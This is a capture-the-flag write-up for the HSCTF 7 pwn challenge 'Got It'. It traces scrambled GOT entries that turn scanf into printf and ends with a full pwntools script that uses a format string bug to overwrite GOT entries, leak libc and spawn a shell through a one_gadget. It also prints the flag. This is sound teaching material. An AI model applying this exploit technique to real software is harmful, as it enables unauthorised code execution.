---
title: "HSCTF 7: Got It (Pwn)"
layout: post
date: 2020-06-07
tags:
- CTF
- writeup
- HSCTF 7
- Pwn
comments: true
---

> Oh no, someone's messed with my GOT entries, and now my function calls are all wrong! Please, you have to help me! I'll do anything to make my function calls right!
>
> This is running on Ubuntu 18.04, with the standard libc.
>
> Connect with `nc pwn.hsctf.com 5004`.
>
> Author: PMP
>
> [got_it](/files/got_it)

As with most pwn challenges, let's start off by checking what kind of binary we're given.

```
vagrant@ctf:/vagrant/challenges/hsctf/Got It$ file got_it
got_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6ea73b9292490795954e28c84bc26a05a3fc6c1f, for GNU/Linux 3.2.0, not stripped
```

Okay, a 64 bit ELF binary. Let's run it to get a better idea of what it does.

```
vagrant@ctf:/vagrant/challenges/hsctf/Got It$ ./got_it
Just minding my own business... AH SHOOT SOMEONE'S ATTACKING ME!
Oh mein GOT, MEINE LIBC FUNKTIONEN SIND ALLE FALSCH!
Give me sumpfink to help me out!
asdf
I don't think "asdf" worked!

```

Once we run the binary, it asks us for _sumpfink_ to help them out. Once it takes our input, it sleeps for a while then tells us if our input "worked". Let's disassemble the binary to get a better idea of what's going on.

```nasm
lea     rdi, large cs:4020D1h ; "I don't think \""
mov     eax, 0
call    sub_401098; "scanf("I don't think\"")"
lea     rax, [rbp-110h]; "input"
mov     rdi, rax
mov     eax, 0
call    sub_401098; "scanf(input)"
lea     rdi, large cs:4020E1h ; "\" worked!!"
mov     eax, 0
call    sub_401098; "scanf("\" wordked!!")"

sub_401098 proc near
jmp     cs:__isoc99_scanf_ptr
sub_401098 endp
```

What the heck? This doesn't make any sense at all. Based on the response when we ran the binary earlier, those are supposed to be printed instead of scanned. Could this be some mistake in the disassembly? Let's run this with `strace`, to see what system calls are being made so that we can put our doubts to rest.

```
vagrant@ctf:/vagrant/challenges/hsctf/Got It$ strace ./got_it
execve("./got_it", ["./got_it"], 0x7fffffffddb0 /* 55 vars */) = 0
brk(NULL)                               = 0x405000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=100091, ...}) = 0
mmap(NULL, 100091, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fde000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\260\34\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=2030544, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fdc000
mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff79e4000
mprotect(0x7ffff7bcb000, 2097152, PROT_NONE) = 0
mmap(0x7ffff7dcb000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7ffff7dcb000
mmap(0x7ffff7dd1000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7dd1000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fdd4c0) = 0
mprotect(0x7ffff7dcb000, 16384, PROT_READ) = 0
mprotect(0x403000, 4096, PROT_READ)     = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7fde000, 100091)          = 0
write(1, "Just minding my own business... "..., 64Just minding my own business... AH SHOOT SOMEONE'S ATTACKING ME!) = 64
write(1, "\n", 1
)                       = 1
mprotect(0x403000, 4096, PROT_READ|PROT_WRITE) = 0
write(1, "Oh mein GOT, MEINE LIBC FUNKTION"..., 52Oh mein GOT, MEINE LIBC FUNKTIONEN SIND ALLE FALSCH!) = 52
write(1, "\n", 1
)                       = 1
rt_sigaction(SIGALRM, {sa_handler=0x401196, sa_mask=[ALRM], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7ffff7a22f20}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
alarm(30)                               = 0
write(1, "Give me sumpfink to help me out!", 32Give me sumpfink to help me out!) = 32
write(1, "\n", 1
)                       = 1
read(0, asdf
"a", 1)                         = 1
read(0, "s", 1)                         = 1
read(0, "d", 1)                         = 1
read(0, "f", 1)                         = 1
read(0, "\n", 1)                        = 1
nanosleep({tv_sec=3, tv_nsec=0}, 0x7fffffffdb70) = 0
write(1, "I don't think \"", 15I don't think ")        = 15
write(1, "asdf", 4asdf)                     = 4
write(1, "\" worked!!", 10" worked!!)             = 10
exit_group(0)                           = ?
+++ exited with 0 +++
```

Okay, looks like `write` is actually being called. No mistake about it, `scanf` is not `scanf`. There are two things that immediately stick out from this trace:

1. We have extra things being printed e.g. `"Oh mein GOT, MEINE LIBC FUNKTION..."`
2. `mprotect(0x403000, 4096, PROT_READ|PROT_WRITE)` seems really out of place.

Let's investigate further using these as our leads.

```nasm
mov     rax, cs:puts_ptr
mov     [rbp-30h], rax
mov     rax, cs:printf_ptr
mov     [rbp-28h], rax
mov     rax, cs:__isoc99_scanf_ptr
mov     [rbp-20h], rax
mov     rax, cs:atoi_ptr
mov     [rbp-18h], rax
mov     rax, cs:alarm_ptr
mov     [rbp-10h], rax
mov     rax, cs:sleep_ptr
mov     [rbp-8], rax
mov     edx, 3          ; prot
mov     esi, 1000h      ; len
mov     edi, 403000h    ; addr
call    _mprotect       ; "mprotect(0x403000, 4096, PROT_READ|PROT_WRITE)"
mov     rax, cs:table
lea     rdx, [rax-48h]
mov     rax, [rbp-18h]
mov     [rdx], rax
mov     rax, cs:table
lea     rdx, [rax-40h]
mov     rax, [rbp-20h]
mov     [rdx], rax
mov     rax, cs:table
lea     rdx, [rax-18h]
mov     rax, [rbp-28h]
mov     [rdx], rax
mov     rax, cs:table
lea     rdx, [rax-20h]
mov     rax, [rbp-30h]
mov     [rdx], rax
mov     rax, cs:table
lea     rdx, [rax-38h]
mov     rax, [rbp-8]
mov     [rdx], rax
mov     rax, cs:table
lea     rdx, [rax-8]
mov     rax, [rbp-10h]
mov     [rdx], rax
lea     rdi, large cs:402078h ; "Oh mein GOT, MEINE LIBC FUNKTIONEN SIND"...
```

There's a number of things going on here. Firstly, `mprotect` is trying to enable read and write for `0x403000` to `0x404000`. We'll start off by examining that range of memory.

```
.got:0000000000403F70 _got            segment para public 'DATA' use64
.got:0000000000403F70                 assume cs:_got
.got:0000000000403F70                 ;org 403F70h
.got:0000000000403F70 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got:0000000000403F78 qword_403F78    dq 0                    ; DATA XREF: sub_401020↑r
.got:0000000000403F80 qword_403F80    dq 0                    ; DATA XREF: sub_401020+6↑r
.got:0000000000403F88 fgets_ptr       dq offset fgets         ; DATA XREF: _fgets↑r
.got:0000000000403F90 signal_ptr      dq offset signal        ; DATA XREF: _signal↑r
.got:0000000000403F98 setvbuf_ptr     dq offset setvbuf       ; DATA XREF: _setvbuf↑r
.got:0000000000403FA0 mprotect_ptr    dq offset mprotect      ; DATA XREF: _mprotect↑r
.got:0000000000403FA8 exit_ptr        dq offset exit          ; DATA XREF: _exit↑r
.got:0000000000403FB0 _ITM_deregisterTMCloneTable_ptr dq offset _ITM_deregisterTMCloneTable
.got:0000000000403FB0                                         ; DATA XREF: deregister_tm_clones+D↑r
.got:0000000000403FB8 puts_ptr        dq offset __imp_puts    ; DATA XREF: sub_401080↑r
.got:0000000000403FB8                                         ; setup+50↑r
.got:0000000000403FC0 printf_ptr      dq offset printf        ; DATA XREF: setup+5B↑r
.got:0000000000403FC8 alarm_ptr       dq offset __imp_alarm   ; DATA XREF: sub_401088↑r
.got:0000000000403FC8                                         ; setup+7C↑r
.got:0000000000403FD0 __libc_start_main_ptr dq offset __libc_start_main
.got:0000000000403FD0                                         ; DATA XREF: _start+28↑r
.got:0000000000403FD8 __gmon_start___ptr dq offset __gmon_start__
.got:0000000000403FD8                                         ; DATA XREF: _init_proc+8↑r
.got:0000000000403FE0 atoi_ptr        dq offset __imp_atoi    ; DATA XREF: sub_401090↑r
.got:0000000000403FE0                                         ; setup+71↑r
.got:0000000000403FE8 __isoc99_scanf_ptr dq offset __imp___isoc99_scanf
.got:0000000000403FE8                                         ; DATA XREF: sub_401098↑r
.got:0000000000403FE8                                         ; setup+66↑r
.got:0000000000403FF0 _ITM_registerTMCloneTable_ptr dq offset _ITM_registerTMCloneTable
.got:0000000000403FF0                                         ; DATA XREF: register_tm_clones+1F↑r
.got:0000000000403FF8 sleep_ptr       dq offset __imp_sleep   ; DATA XREF: sub_4010A0↑r
.got:0000000000403FF8                                         ; setup+87↑r
.got:0000000000403FF8 _got            ends
```

Interestingly, the [Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table) is within this range. This stands out to us for a couple of reasons:

1. The challenge description references the GOT i.e. `Oh no, someone's messed with my GOT entries`
2. The challenge is named __Got__ it
3. The disassembly we found above (the one with `mprotect`) references GOT entries e.g. `puts_ptr`

If we piece together all the clues we have, this actually starts to make sense. Looking at the earlier disassembly, we can actually see the GOT entries being scrambled, which explains why we noticed that `scanf` became `printf` in the first place. Additionally if we had to guess, I'd bet on the binary having [Full RELRO](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) which makes the GOT read-only which is why `mprotect` had to be called. Let's test our hypothesis.

```
vagrant@ctf:/vagrant/challenges/hsctf/Got It$ checksec got_it
[*] '/vagrant/challenges/hsctf/Got It/got_it'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Bingo. Looking back, we can start to see a pretty obvious [Format String vulnerability](https://owasp.org/www-community/attacks/Format_string_attack) because our input was called with `scanf` which actually points to `printf` after the GOT entries got scrambled. This gives us both a read primitive and write primitive i.e. we can read and write to a target address (as long as permissions allow).

Okay so let's summarize our plan of attack:

1. First payload (Loop main around, disable sleep)
    - Loop around main to send more payloads
        - Overwrite `exit` GOT entry to `main`
    - Disable 30s sleep (in setup)
        - Overwrite `sleep` GOT entry to a ret gadget
        - Overwrite `alarm` GOT entry to a ret gadget
        - Overwrite `signal` GOT entry to a ret gadget

2. Second payload
  - Leak libc address of `__libc_start_main + 231`.

3. Third payload
  - Overwrite `printf` GOT entry to `one_ gadget`

Now let's write our exploit.

```python
#! /usr/bin/python3

from pwn import *

HOST = 'pwn.hsctf.com'
PORT = 5004
BINARY = './got_it'
LIBC_PATH = './libc.so.6'

elf = context.binary = ELF(BINARY)
libc = ELF(LIBC_PATH)

elf.symbols['ret'] = 0x4012f8  # ret slide
libc.symbols['one_gadget'] = 0x4f322


def send_payload(payload):
    log.info(f'Payload: {repr(payload)}')

    r.sendline(payload)

    r.recvuntil('"')
    response = r.recvuntil('"')[:-1]

    r.recvuntil('worked!!')

    r.sendline()
    r.sendline()

    return response


# Add some swag

splash()

# Start connection

r = remote(HOST, PORT)

# Initialize format string helper

fmt = FmtStr(execute_fmt = send_payload, offset = 8)

# Stage 1: Loop main, disable sleep

with log.progress('Stage 1: Loop main, disable sleep'):
    fmt.write(elf.got['exit'], elf.symbols['main'])
    log.info('exit -> main')

    fmt.write(elf.got['sleep'], elf.symbols['ret'])
    fmt.write(elf.got['alarm'], elf.symbols['ret'])
    fmt.write(elf.got['signal'], elf.symbols['ret'])
    log.info('sleep -> ret')
    log.info('alarm -> ret')
    log.info('signal -> ret')

    fmt.execute_writes()

# Stage 2: Leak libc_start_main + 231

with log.progress('Stage 2: Leak __libc_start_main + 231'):
    libc_start_main_231 = fmt.leak_stack(119)
    log.info(f'Leaked (__libc_start_main + 231): 0x{libc_start_main_231:08x}')

    libc.address = libc_start_main_231 - (libc.symbols['__libc_start_main'] + 231)
    log.info(f'Calculated libc base address: 0x{libc.address:08x}')

# Stage 3: One Gadget

with log.progress('Stage 3: One Gadget'):
    fmt.write(elf.got['printf'], libc.symbols['one_gadget'])
    log.info('printf -> one gadget')

    fmt.execute_writes()

# Stage 4: Pwn

with log.progress('Stage 4: Pwn'):
    r.interactive()

r.close()

```

Let's see it in action!

<script id="asciicast-337112" src="https://asciinema.org/a/337112.js" async></script>

Flag: `flag{fl1gh7_0f_7h3_l1bc_func710n5_77e82515}`
